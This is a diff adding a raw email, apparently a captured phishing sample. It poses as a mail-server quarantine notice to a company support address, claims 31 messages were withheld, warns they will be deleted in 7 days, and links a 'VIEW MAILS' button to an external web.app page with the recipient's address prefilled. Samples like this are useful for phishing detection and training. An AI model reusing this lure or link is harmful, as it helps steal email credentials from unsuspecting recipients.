@@ -1,0 +1,124 @@
+Return-Path: <winery@hardynet.com>
+Received: from gator4148.hostgator.com
+	by gator4148.hostgator.com with LMTP
+	id kEAPAsOiuWLdPwUA7/vpDg
+	(envelope-from <winery@hardynet.com>); Mon, 27 Jun 2022 07:29:55 -0500
+Return-path: <winery@hardynet.com>
+Envelope-to: customersupport@caldonbiotech.com
+Delivery-date: Mon, 27 Jun 2022 07:29:55 -0500
+Received: from mailer28.gate88.rs.smtp.com ([74.91.88.28]:49237)
+	by gator4148.hostgator.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.95)
+	(envelope-from <winery@hardynet.com>)
+	id 1o5nsI-001qh8-72
+	for customersupport@caldonbiotech.com;
+	Mon, 27 Jun 2022 07:29:54 -0500
+X-MSFBL: ZeFgE82zL6ZrUr9pxN1otn2eHeXxZCIt0huUOJ6XWTY=|eyJyIjoiY3VzdG9tZXJ
+	zdXBwb3J0QGNhbGRvbmJpb3RlY2guY29tIiwiZyI6Im5ld3NpZ251cF9zaGFyZWR
+	fcG9vbCIsImIiOiJuZXdzaWdudXBfc2hhcmVkX3Bvb2xfNzRfOTFfODhfMjgifQ=
+	=
+Received: from [10.137.129.34] ([10.137.129.34:47786] helo=[10.0.48.128])
+	by mtl-mtsp-mta04-out2.smtp.com (envelope-from <winery@hardynet.com>)
+	(ecelerity 4.2.38.62370 r(:)) with ESMTP
+	id 75/64-21046-5B2A9B26; Mon, 27 Jun 2022 12:29:41 +0000
+Received: Received from 10.137.11.89 by Caffeine (mtl-mtsp-c02-2) with SMTP id
+ 7c6b1614-8bd1-4cfa-924b-5c17cbbed762  for customersupport@caldonbiotech.com;
+  Mon, 27 Jun 2022 12:29:26 +0000 (UTC)
+Received: from [13.57.252.197] ([13.57.252.197:23460] helo=hardynet.com)
+	by mtl-mtsp-mta04-in1 (envelope-from <winery@hardynet.com>)
+	(ecelerity 4.1.0.46749 r(Core:4.1.0.4)) with ESMTPA
+	id 6E/B6-28893-6A2A9B26; Mon, 27 Jun 2022 12:29:26 +0000
+From: "Quarantine Notification" <winery@hardynet.com>
+To: customersupport@caldonbiotech.com
+Subject: Notification
+Date: 27 Jun 2022 12:29:25 +0000
+Message-ID: <20220627122925.3D4DB5A31DA8E7A8@hardynet.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Feedback-ID: 9091965:SMTPCOM
+X-SMTPCOM-Sender-ID: 9091965
+X-SMTPCOM-Tracking-Number: 7c6b1614-8bd1-4cfa-924b-5c17cbbed762
+X-SMTPCOM-Message-ID: 6ee0e1ef-6741-425c-8b1f-f7a223eeb21b
+X-SMTPCOM-Payload: 
+ BS0RXowa6Q_EKIho3CELJhRHy6f62jRyI4yfqoA-a76FWfcclwBfFFjPBsk4b0TsdplHZBcMWakyNELpFratBfiDpzJBb0JU_wD1z7nARrCEMq0TSU0YDqiRPZaHMoE7QkNwoyQyt5ne0TbRnJwGf40qz_jUsfm0Bq8eclNqyK7w541pMKhG7qR_-8F5_M-PrDpMuNxYMoCRrz-FMtYcWw==
+List-Unsubscribe: 
+ <mailto:abuse@abuse.smtp.com?subject=MailStop&body=6ee0e1ef-6741-425c-8b1f-f7a223eeb21b_9091965>,
+ <http://legacyapi-mtl.smtp.com/unsubscribe?mid=6ee0e1ef-6741-425c-8b1f-f7a223eeb21b&sid=9091965>
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=smtpsendemail.com;
+ i=@smtpsendemail.com; q=dns/txt; s=smtpcustomer; t=1656332974; h=from
+ : to : subject : date : message-id : mime-version : content-type :
+ content-transfer-encoding : list-unsubscribe : from;
+ bh=G6CU6CZxOVWmvb9fHCJ3/iD2a1G/iZ7bHDSJivogidA=;
+ b=lFFDilbPPTDWXDaCMD2uH+fm1Xq8OhATCWNF/kRVIkTbC0IqDsTCdRHUQshi3OZaoqzKq
+ XyWHbNeBGk5swgU7kCekocqvNulvrykfrvGCQw2SAORob5v5JsQbCQWehuu1keDc7sPJwdX
+ 6Cs7pJ48JbZA8OGw7bGflH4aEDoqpWDtd/kkl5I6tjN7xS5PJMwidH66xNdpwpJAnsPW/Ch
+ HaiQ4YYYgGMrJ756ibsKMEMiURrl/U6BOIFoUg/uXI+L4vAEOnCOZPCMAvcZN/T6uqIlzyE
+ bVySUvoT9j/zgiJaiyf7Ztv50XSrmGcPwqPbPQDMyMGkYL/fYkSMqeIFnJqQ==
+X-Report-Abuse: SMTP.com is an email service provider. Our abuse team cares about your feedback. Please contact abuse@smtp.com for further investigation.
+X-Spam-Status: No, score=6.6
+X-Spam-Score: 66
+X-Spam-Bar: ++++++
+X-Spam-Flag: NO
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.17037">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"100%" style=3D"border: 1px solid rgb(204, 204, 204); border=
+-image: none; color: rgb(51, 51, 51); text-transform: none; line-height: no=
+rmal; text-indent: 0px; letter-spacing: normal; font-family: arial, helveti=
+ca, sans-serif; font-size: 13px; font-style: normal; font-weight: 400; word=
+-spacing: 0px; white-space: normal; border-collapse: collapse; orphans: 2; =
+widows: 2; text-decoration-style: initial; text-decoration-color: initial; =
+font-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px;" bgcolor=3D"#ffffff" border=3D"0" c=
+ellspacing=3D"0" cellpadding=3D"0">
+
+<tbody><tr>
+<td style=3D"background: rgb(236, 243, 249); padding: 0px 15px; line-height=
+: 27px; font-family: calibri;"><strong><span style=3D"font-size: large;"><b=
+r><br><br>NOTICE:&nbsp;customersupport@caldonbiotech.com&nbsp;</span></stro=
+ng></td></tr>
+<tr>
+<td style=3D"background: rgb(236, 243, 249); padding: 0px 15px 5px; line-he=
+ight: 27px; font-family: calibri;"><span style=3D"font-size: large;"><br>
+Our Server has prevented the delivery of&nbsp;31 new emails to your inbox a=
+s of&nbsp;6/27/2022 12:29:25 p.m. because it identified these messages as s=
+pam. You can review these and choose what happens to them so as not to miss=
+ out on important messages. You can also get more information about quarant=
+ined messages by going to the Security and Compliance Portal.<br><br>&nbsp;=
+</span></td></tr>
+<tr>
+<td width=3D"300" align=3D"left" style=3D"padding-left: 15px;"><span style=
+=3D"font-size: large;">&nbsp;</span></td></tr>
+<tr>
+<td style=3D"padding: 5px 15px; line-height: 0;"><span style=3D"font-size: =
+large;">&nbsp;</span></td></tr>
+<tr style=3D"background: rgb(228, 228, 228); margin-top: 10px;">
+<td style=3D"padding: 10px 15px; line-height: 20px; font-family: calibri;">=
+
+<p style=3D"margin: 0px;">&nbsp;</p><span style=3D"font-size: large;">Email=
+s will be deleted automatically after 7 days.</span></td></tr>
+<tr align=3D"left" style=3D"background: rgb(228, 228, 228); padding: 0px 0p=
+x 10px 15px; margin-top: 10px;">
+<td style=3D"padding-top: 10px; padding-bottom: 10px; padding-left: 15px;">=
+
+<table width=3D"100%" style=3D"line-height: normal; border-collapse: collap=
+se;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+
+<tbody><tr>
+<td style=3D"padding: 0px;">
+<table style=3D"line-height: normal; border-collapse: collapse;" border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"0">
+
+<tbody><tr>
+<td align=3D"center" style=3D"padding: 7px 12px; border-radius: 3px;" bgcol=
+or=3D"#f7941d"><a class=3D"daria-goto-anchor" style=3D"color: rgb(1, 134, 1=
+86);" href=3D"https://lehardrrils.web.app/cemir/index.html?e=3Dcustomersupp=
+ort@caldonbiotech.com" target=3D"_blank" rel=3D"noopener noreferrer">VIEW M=
+AILS</a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbo=
+dy></table>
+all me when your free</body></html>
